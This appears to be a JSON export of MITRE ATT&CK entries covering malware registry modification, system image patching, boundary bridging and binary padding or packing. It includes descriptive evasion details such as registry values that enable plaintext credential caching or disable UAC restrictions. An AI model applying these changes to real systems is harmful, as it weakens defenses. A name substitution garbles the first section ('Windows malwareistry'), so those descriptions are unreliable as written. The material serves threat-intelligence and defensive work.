                "Description": "malware has the ability to modify Registry keys to disable crash dumps, colors for compressed files, and pop-up information about folders and desktop items.[68][69][70]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.[71]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. malware's backdoor also enables remote attackers to modify and delete subkeys.[72][73]"
            },
            "S0537": {
                "ID": "S0537",
                "Name": "HyperStack",
                "Description": "malware can add the name of its communication pipe to HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\\NullSessionPipes.[74]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware has a command to create, set, copy, or delete a specified Registry key or value.[75][76]"
            },
            "S0271": {
                "ID": "S0271",
                "Name": "KEYMARBLE",
                "Description": "malware has a command to create Registry entries for storing data under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath.[77]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has modified Registry settings for default file associations to enable all macros and for persistence.[78][79][80][81]"
            },
            "S0669": {
                "ID": "S0669",
                "Name": "KOCTOPUS",
                "Description": "malware has added and deleted keys from the Registry.[82]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware has modified registry keys of ComSysApp, Svchost, and xmlProv on the machine to gain persistence.[83][84]"
            },
            "S0397": {
                "ID": "S0397",
                "Name": "LoJax",
                "Description": "malware has modified the Registry key \u2018HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute\u2019 from \u2018autocheck autochk \u2019 to \u2018autocheck autoche \u2019.[85]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware has modified the Registry as part of its UAC bypass process.[86]"
            },
            "G1014": {
                "ID": "G1014",
                "Name": "LuminousMoth",
                "Description": "malware has used malware that adds Registry keys for persistence.[87][88]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can manipulate the system registry on a compromised host.[89]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has modified Registry settings for security tools.[90]"
            },
            "S0576": {
                "ID": "S0576",
                "Name": "MegaCortex",
                "Description": "malware has added entries to the Registry for ransom contact information.[91]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can write the process ID of a target process into the HKEY_LOCAL_MACHINE\\SOFTWARE\\DDE\\tpid Registry value as part of its reflective loading activity.[89]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has written process names to the Registry, disabled IE browser features, deleted Registry keys, and changed the ExtendedUIHoverTime key.[92][93][94][95]"
            },
            "S1047": {
                "ID": "S1047",
                "Name": "Mori",
                "Description": "malware can write data to HKLM\\Software\\NFC\\IPA and HKLM\\Software\\NFC\\ and delete Registry values.[96][97]"
            },
            "S0256": {
                "ID": "S0256",
                "Name": "Mosquito",
                "Description": "malware can modify Registry keys under HKCU\\Software\\Microsoft[dllname] to store configuration values. malware also modifies Registry keys under HKCR\\CLSID...\\InprocServer32 with a path to the launcher.[98]"
            },
            "S0205": {
                "ID": "S0205",
                "Name": "Naid",
                "Description": "malware creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.[99]"
            },
            "S0336": {
                "ID": "S0336",
                "Name": "NanoCore",
                "Description": "malware has the capability to edit the Registry.[100][101]"
            },
            "S0691": {
                "ID": "S0691",
                "Name": "Neoichor",
                "Description": "malware has the ability to configure browser settings by modifying Registry entries under HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer.[102]"
            },
            "S0210": {
                "ID": "S0210",
                "Name": "Nerex",
                "Description": "malware creates a Registry subkey that registers a new service.[103]"
            },
            "S0457": {
                "ID": "S0457",
                "Name": "Netwalker",
                "Description": "malware can add the following registry entry: HKEY_CURRENT_USER\\SOFTWARE{8 random characters}.[104]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can modify the Registry to store its configuration information.[105]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, threat actors used zwShell to establish full remote control of the connected machine and manipulate the Registry.[106]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware can modify the Registry to set the ServiceDLL for a service created by the malware for persistence.[107]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware can create, delete, or modify a specified Registry key or value.[108][109]"
            },
            "C0006": {
                "ID": "C0006",
                "Name": "Operation Honeybee",
                "Description": "During malware, the threat actors used batch files that modified registry keys.[110]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, the threat actors enabled Wdigest by changing the HKLM\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest registry value from 0 (disabled) to 1 (enabled).[111]"
            },
            "S0229": {
                "ID": "S0229",
                "Name": "Orz",
                "Description": "malware can perform Registry operations.[112]"
            },
            "S0664": {
                "ID": "S0664",
                "Name": "Pandora",
                "Description": "malware can write an encrypted token to the Registry to enable processing of remote commands.[113]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "A malware payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.[114]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "malware can delete its persistence mechanisms from the registry.[115]"
            },
            "S0158": {
                "ID": "S0158",
                "Name": "PHOREAL",
                "Description": "malware is capable of manipulating the Registry.[116]"
            },
            "S0517": {
                "ID": "S0517",
                "Name": "Pillowmint",
                "Description": "malware has modified the Registry key HKLM\\SOFTWARE\\Microsoft\\DRM to store a malicious payload.[117]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "malware has modified the Registry to store its encrypted payload.[118]"
            },
            "S0254": {
                "ID": "S0254",
                "Name": "PLAINTEE",
                "Description": "malware uses reg add to add a Registry Run key for persistence.[119]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware has a module to create, delete, or modify Registry keys.[120]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has made registry modifications to alter its behavior upon execution.[121]"
            },
            "S0012": {
                "ID": "S0012",
                "Name": "PoisonIvy",
                "Description": "malware creates a Registry subkey that registers a new system device.[122]"
            },
            "S0518": {
                "ID": "S0518",
                "Name": "PolyglotDuke",
                "Description": "malware can write encrypted JSON configuration files to the Registry.[123]"
            },
            "S0441": {
                "ID": "S0441",
                "Name": "PowerShower",
                "Description": "malware has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.[124]"
            },
            "S1058": {
                "ID": "S1058",
                "Name": "Prestige",
                "Description": "malware has the ability to register new registry keys for a new extension handler via HKCR\\.enc and HKCR\\enc\\shell\\open\\command.[125]"
            },
            "S0583": {
                "ID": "S0583",
                "Name": "Pysa",
                "Description": "malware has modified the registry key \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" and added the ransom note.[126]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can modify the Registry to store its configuration information in a randomly named subkey under HKCU\\Software\\Microsoft.[127][128]"
            },
            "S0269": {
                "ID": "S0269",
                "Name": "QUADAGENT",
                "Description": "malware modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.[129]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware has a command to edit the Registry on the victim\u2019s machine.[130][131]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware can write its configuration file to the Registry.[37][132]"
            },
            "S0075": {
                "ID": "S0075",
                "Name": "Reg",
                "Description": "malware may be used to interact with and modify the Windows malwareistry of a local or remote system at the command-line interface.[1]"
            },
            "S0511": {
                "ID": "S0511",
                "Name": "RegDuke",
                "Description": "malware can create seemingly legitimate Registry key to store its encryption key.[123]"
            },
            "S0019": {
                "ID": "S0019",
                "Name": "Regin",
                "Description": "malware appears to have functionality to modify remote Registry information.[133]"
            },
            "S0332": {
                "ID": "S0332",
                "Name": "Remcos",
                "Description": "malware has full control of the Registry, including the ability to modify it.[134]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can modify the Registry to save encryption parameters and system information.[135][136][137][138][139]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can modify the HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\ registry key so it can bypass the VB object model (VBOM) on a compromised host.[140]"
            },
            "S0090": {
                "ID": "S0090",
                "Name": "Rover",
                "Description": "malware has functionality to remove Registry Run key persistence as a cleanup procedure.[141]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can delete all Registry entries created during its execution.[142]"
            },
            "S1099": {
                "ID": "S1099",
                "Name": "Samurai",
                "Description": "The malware loader component can create multiple Registry keys to force the svchost.exe process to load the final backdoor.[143]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware can modify the Registry to store and maintain a configuration block and virtual file system.[144][53]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "Once malware has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1.[145][146][147]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware has registered two registry keys for shim databases.[148]"
            },
            "S0589": {
                "ID": "S0589",
                "Name": "Sibot",
                "Description": "malware has modified the Registry to install a second-stage script in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot.[149]"
            },
            "G0091": {
                "ID": "G0091",
                "Name": "Silence",
                "Description": "malware can create, delete, or modify a specified Registry key or value.[150]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can modify registry keys, including to enable or disable Remote Desktop Protocol (RDP).[151]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry.[152]"
            },
            "S0649": {
                "ID": "S0649",
                "Name": "SMOKEDHAM",
                "Description": "malware has modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP.[153]"
            },
            "S0157": {
                "ID": "S0157",
                "Name": "SOUNDBITE",
                "Description": "malware is capable of modifying the Registry.[116]"
            },
            "S0142": {
                "ID": "S0142",
                "Name": "StreamEx",
                "Description": "malware has the ability to modify the Registry.[154]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware can create registry keys to load driver files.[155]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\[service_name]\\Start registry entries to value 4.[156][157] It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.[158]"
            },
            "S0242": {
                "ID": "S0242",
                "Name": "SynAck",
                "Description": "malware can manipulate Registry keys.[159]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can write its configuration file to Software\\Classes\\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER.[113]"
            },
            "G0092": {
                "ID": "G0092",
                "Name": "TA505",
                "Description": "malware has used malware to disable Windows Defender through modification of the Registry.[160]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware has the ability to modify the Registry on compromised hosts using RegDeleteValueA and RegCreateKeyExA.[161]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware can set the KeepPrintedJobs attribute for configured printers in SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers to enable document stealing.[162]"
            },
            "S1011": {
                "ID": "S1011",
                "Name": "Tarrask",
                "Description": "malware is able to delete the Security Descriptor (SD) registry subkey in order to \"hide\" scheduled tasks.[163]"
            },
            "S0560": {
                "ID": "S0560",
                "Name": "TEARDROP",
                "Description": "malware modified the Registry to create a Windows service for itself on a compromised host.[164]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "A malware tool has created new Registry keys under HKEY_CURRENT_USER\\Software\\Classes\\ and HKLM\\SYSTEM\\CurrentControlSet\\services.[165][113]"
            },
            "S0665": {
                "ID": "S0665",
                "Name": "ThreatNeedle",
                "Description": "malware can modify the Registry to save its configuration data as the following RC4-encrypted Registry key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon.[166]"
            },
            "S0668": {
                "ID": "S0668",
                "Name": "TinyTurla",
                "Description": "malware can set its configuration parameters in the Registry.[167]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware can modify registry entries.[168]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware has modify Registry values to store payloads.[169][170]"
            },
            "S0263": {
                "ID": "S0263",
                "Name": "TYPEFRAME",
                "Description": "malware can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.[171]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can store configuration information in the Registry including the initialization vector and AES key needed to find and decrypt other malware components.[172]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has used Registry modifications as part of its installation routine.[173][174]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware has the ability to modify the Registry key HKCU\\Software\\ApplicationContainer\\Appsw64 to store information regarding the C2 server and downloads.[175][176][177]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware modifies the Registry to store an encoded configuration file in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security.[178][179]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can create HKCU\\Software\\Classes\\Folder\\shell\\open\\command as a new registry key during privilege escalation.[180][181]"
            },
            "S0612": {
                "ID": "S0612",
                "Name": "WastedLocker",
                "Description": "malware can modify registry values within the Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry key.[182]"
            },
            "S0579": {
                "ID": "S0579",
                "Name": "Waterbear",
                "Description": "malware has deleted certain values from the Registry to load a malicious DLL.[183]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has modified the Registry key HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory. malware has also modified the WDigest registry key to allow plaintext credentials to be cached in memory.[184][185]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware modifies several Registry keys under HKCU\\Software\\Microsoft\\Internet Explorer\\ PhishingFilter\\ to disable phishing filters.[186]"
            },
            "S0350": {
                "ID": "S0350",
                "Name": "zwShell",
                "Description": "malware can modify the Registry.[106]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can create Registry entries to enable services to run.[187]"
            }
        }
    },
    "T1601": {
        "ttp_name": "Modify System Image",
        "ttp_id": "T1601",
        "href": "/techniques/T1601",
        "subtechnique": {
            "001": {
                "name": "Patch System Image",
                "href": "/techniques/T1601/001",
                "description": "Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.[1] [2] [3] [4] [5] Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging.  Adding new capabilities for the adversary\u2019s purpose include Keylogging, Multi-hop Proxy, and Port Knocking.Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via TFTP Boot. When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.",
                "Procedure": {
                    "S0519": {
                        "ID": "S0519",
                        "Name": "SYNful Knock",
                        "Description": "<name> is malware that is inserted into a network device by patching the operating system image.[6][7]"
                    }
                }
            },
            "002": {
                "name": "Downgrade System Image",
                "href": "/techniques/T1601/002",
                "description": "Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. [1]On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as Weaken Encryption.  Downgrading of a system image can be done on its own, or it can be used in conjunction with Patch System Image.",
                "Procedure": {}
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",
        "Procedure": {}
    },
    "T1599": {
        "ttp_name": "Network Boundary Bridging",
        "ttp_id": "T1599",
        "href": "/techniques/T1599",
        "subtechnique": {
            "001": {
                "name": "Network Address Translation Traversal",
                "href": "/techniques/T1599/001",
                "description": "Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.[1]When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  Adversaries may use Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",
                "Procedure": {}
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy or exfiltration of data via Traffic Duplication. Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals.[1]  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
        "Procedure": {}
    },
    "T1027": {
        "ttp_name": "Obfuscated Files or Information",
        "ttp_id": "T1027",
        "href": "/techniques/T1027",
        "subtechnique": {
            "001": {
                "name": "Binary Padding",
                "href": "/techniques/T1027/001",
                "description": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.[1] The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.[2] Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.[3]",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> used large size files to avoid detection by security solutions with hardcoded size limits.[4]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> includes garbage code to mislead anti-malware software and researchers.[1][5]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has appended random binary data to the end of itself to generate a large binary.[6]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "<name> had added data prior to the Portable Executable (PE) header to prevent automatic scanners from identifying the payload.[7]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> downloader code has included \"0\" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.[8][9]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.[10]"
                    },
                    "S0137": {
                        "ID": "S0137",
                        "Name": "CORESHELL",
                        "Description": "<name> contains unused machine instructions in a likely attempt to hinder analysis.[11]"
                    },
                    "S0614": {
                        "ID": "S0614",
                        "Name": "CostaBricks",
                        "Description": "<name> has added the entire unobfuscated code of the legitimate open source application Blink to its code.[12]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has added extra spaces between JavaScript code characters to increase the overall file size.[13]"
                    },
                    "S0082": {
                        "ID": "S0082",
                        "Name": "Emissary",
                        "Description": "A variant of <name> appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.[14]"
                    },
                    "S0512": {
                        "ID": "S0512",
                        "Name": "FatDuke",
                        "Description": "<name> has been packed with junk code and strings.[15]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used random junk code to obfuscate malware code.[16]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> contains junk code in its functions in an effort to confuse disassembly programs.[17][18]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has obfuscated .NET executables by inserting junk code.[19]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can use junk code to hide functions and evade detection.[20]"
                    },
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has had null characters padded in its malicious DLL payload.[21]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> has added BMP images to the resources section of its Portable Executable (PE) file increasing each binary to at least 300MB in size.[22]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> has the ability to add bytes to change the file hash.[23]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> performed padding with null bytes before calculating its hash.[24]"
                    },
                    "S0528": {
                        "ID": "S0528",
                        "Name": "Javali",
                        "Description": "<name> can use large obfuscated libraries to hinder detection and analysis.[25]"
                    },
                    "S0236": {
                        "ID": "S0236",
                        "Name": "Kwampirs",
                        "Description": "Before writing to disk, <name> inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.[26]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has inserted garbage characters into code, presumably to avoid anti-virus detection.[27]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "<name> has inserted large blocks of junk code, including some components to decrypt strings and other important information for later in the encryption process.[28]"
                    },
                    "G0002": {
                        "ID": "G0002",
                        "Name": "Moafee",
                        "Description": "<name> has been known to employ binary padding.[29]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has used junk code within their DLL files to hinder analysis.[30]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.[31]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> has used useless code blocks to counter analysis.[32]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use large file sizes to evade detection.[33][34]"
                    },
                    "S0433": {
                        "ID": "S0433",
                        "Name": "Rifdoor",
                        "Description": "<name> has added four additional bytes of data upon launching, then saved the changed version as C:\\ProgramData\\Initech\\Initech.exe.[35]"
                    },
                    "S0370": {
                        "ID": "S0370",
                        "Name": "SamSam",
                        "Description": "<name> has used garbage code to pad some of its malware components.[36]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> can obfuscate strings using junk Chinese characters.[37]"
                    },
                    "S0586": {
                        "ID": "S0586",
                        "Name": "TAINTEDSCRIBE",
                        "Description": "<name> can execute FileRecvWriteRand to append random bytes to the end of a file received from C2.[38]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "<name> contains junk code to increase its entropy and hide the actual code.[39]"
                    },
                    "S0117": {
                        "ID": "S0117",
                        "Name": "XTunnel",
                        "Description": "A version of <name> introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.[40]"
                    },
                    "S0248": {
                        "ID": "S0248",
                        "Name": "yty",
                        "Description": "<name> contains junk code in its binary, likely to confuse malware analysts.[41]"
                    },
                    "S0230": {
                        "ID": "S0230",
                        "Name": "ZeroT",
                        "Description": "<name> has obfuscated DLLs and functions using dummy API calls inserted between real instructions.[42]"
                    }
                }
            },
            "002": {
                "name": "Software Packing",
                "href": "/techniques/T1027/002",
                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.[1] Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.[2]",
                "Procedure": {
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team used UPX to pack a copy of Mimikatz.[3]"
                    },
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> has come with a packed payload.[4]"
                    },
                    "G1007": {
                        "ID": "G1007",
                        "Name": "Aoqin Dragon",
                        "Description": "<name> has used the Themida packer to obfuscate malicious payloads.[5]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> has used UPX packers for its payload DLL.[6]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> used UPX to pack files.[7]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has been known to pack their tools.[8][9]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used several code packing methods such as Themida, Enigma, VMProtect, and Obsidium, to pack their implants.[10]"
                    },
